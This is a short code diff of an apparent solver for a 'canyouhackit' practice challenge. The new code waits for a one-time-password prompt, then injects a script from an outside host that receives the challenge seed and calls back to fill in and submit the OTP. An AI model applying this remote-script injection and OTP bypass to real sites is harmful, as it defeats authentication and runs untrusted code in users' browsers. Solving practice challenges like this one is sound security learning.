@@ -3,20 +3,16 @@
     runSolution( { challenge_id, solution } );
 
     async function solution( tag ){
-        console.log(tag.refs.challengeContent.innerText);
-        await sleep(250);
-        console.log(tag.refs.challengeContent.innerText);
-        await sleep(250);
-        console.log(tag.refs.challengeContent.innerText);
-        await sleep(250);
-        console.log(tag.refs.challengeContent.innerText);
-        await sleep(250);
-        console.log(tag.refs.challengeContent.innerText);
-        await sleep(250);
-        console.log(tag.refs.challengeContent.innerText);
-        await sleep(250);
-        console.log(tag.refs.challengeContent.innerText);
+        window.solution_secure_otp = function(otp){
+            tag.refs.answer.value = otp;
+            tag.submit({});
+        }
+        while( !/Time Remaining/.test(tag.refs.challengeContent.innerText) ){
+            await sleep(100);
+        }
+        document.head.appendChild(document.createElement("script")).src = "https://fockjef.net/canyouhackit/secure_otp.py?seed=" + tag.challenge.seed;
     }
+
     function sleep( ms ){
         return new Promise( resolve => setTimeout( resolve, ms ) );
     }
